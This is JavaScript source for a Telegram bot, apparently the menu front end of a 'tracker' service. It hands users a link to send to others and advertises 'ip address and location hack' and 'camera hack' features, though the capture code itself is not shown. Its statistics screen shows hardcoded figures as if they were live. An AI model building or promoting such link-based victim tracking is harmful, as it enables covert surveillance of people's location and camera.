const { Telegraf, Markup } = require("telegraf");

const bot = new Telegraf(process.env.BOT_TOKEN);

// Domain detection
const DOMAIN = process.env.VERCEL_URL
  ? `https://${process.env.VERCEL_URL}`
  : "https://your-domain.com";

// Stylish Main Menu
function mainMenu() {
  return Markup.inlineKeyboard([
    [
      Markup.button.callback("🎱 Pool Tracking", "pool"),
      Markup.button.callback("⚡ Normal Tracking", "normal")
    ],
    [
      Markup.button.callback("📊 Bot Stats", "stats"),
      Markup.button.callback("🧠 Info", "info")
    ],
    [
      Markup.button.callback("👨‍💻 Developer", "dev")
    ],
    [
      Markup.button.url("🌐 Support Channel", "https://t.me/Mrddev")
    ]
  ]);
}

// Start
bot.start(async (ctx) => {
  await ctx.replyWithPhoto(
    "https://files.catbox.moe/v75lmb.jpeg",
    {
      caption: `
<b>🔱 PRO TRACKER SYSTEM v3.0</b>

━━━━━━━━━━━━━━━━━━
⚡ <b>Status:</b> ONLINE
🤖 <b>Engine:</b> Telegraf Core
🌐 <b>Server:</b> Secure Cloud

Select a module below to begin.

<i>Precision. Speed. Control.</i>
`,
      parse_mode: "HTML",
      ...mainMenu()
    }
  );
});

// Pool Mode
bot.action("pool", async (ctx) => {

  await ctx.answerCbQuery();

  const msg = await ctx.reply("⚙️ Initializing Pool Mode...");

  await new Promise(r => setTimeout(r, 1800));

  await ctx.telegram.editMessageText(
    ctx.chat.id,
    msg.message_id,
    undefined,
    `
🎱 <b>POOL TRACKING MODE</b>

━━━━━━━━━━━━━━━━━━

🔗 <b>Your Link:</b>

<code>${DOMAIN}</code>

Send the link and monitor interactions.

`,
    {
      parse_mode: "HTML",
      ...Markup.inlineKeyboard([
        [Markup.button.callback("⬅ Back", "back")]
      ])
    }
  );
});

// Normal Mode
bot.action("normal", async (ctx) => {

  await ctx.answerCbQuery();

  const msg = await ctx.reply("⚙️ Preparing Normal Mode...");

  await new Promise(r => setTimeout(r, 1800));

  await ctx.telegram.editMessageText(
    ctx.chat.id,
    msg.message_id,
    undefined,
    `
⚡ <b>NORMAL TRACKING MODE</b>

━━━━━━━━━━━━━━━━━━

🔗 <b>Your Link:</b>

<code>${DOMAIN}</code>

Deploy and observe activity.

`,
    {
      parse_mode: "HTML",
      ...Markup.inlineKeyboard([
        [Markup.button.callback("⬅ Back", "back")]
      ])
    }
  );
});

// Stats
bot.action("stats", async (ctx) => {

  await ctx.answerCbQuery();

  await ctx.reply(`
📊 <b>BOT STATISTICS</b>

━━━━━━━━━━━━━━━━━━

👥 Users: 1,024
⚡ Active Sessions: 38
🛰 Server Status: ONLINE
🧠 Version: v3.0

`, { parse_mode: "HTML" });

});

// Info
bot.action("info", async (ctx) => {

  await ctx.answerCbQuery();

  await ctx.reply(`
🧠 <b>ABOUT THIS BOT</b>

━━━━━━━━━━━━━━━━━━

This bot demonstrates an interactive Telegram menu system built with Telegraf.

Features:
• ip address and location hack
• camera hack

`, { parse_mode: "HTML" });

});

// Developer
bot.action("dev", async (ctx) => {

  await ctx.answerCbQuery();

  await ctx.reply(`
👨‍💻 <b>DEVELOPER</b>

━━━━━━━━━━━━━━━━━━

Name: Mr Dev  
Contact: @Mrddev

`, { parse_mode: "HTML" });

});

// Back
bot.action("back", async (ctx) => {

  await ctx.answerCbQuery();

  await ctx.editMessageText(
`<b>🔱 PRO TRACKER SYSTEM v3.0</b>

━━━━━━━━━━━━━━━━━━
Select a module below.

<i>Precision. Speed. Control.</i>`,
{
parse_mode:"HTML",
...mainMenu()
});

});

// Vercel webhook
module.exports = async (req, res) => {

  if (req.method === "POST") {
    await bot.handleUpdate(req.body);
    res.status(200).send("OK");
  } else {
    res.status(200).send("Bot Running");
  }

};
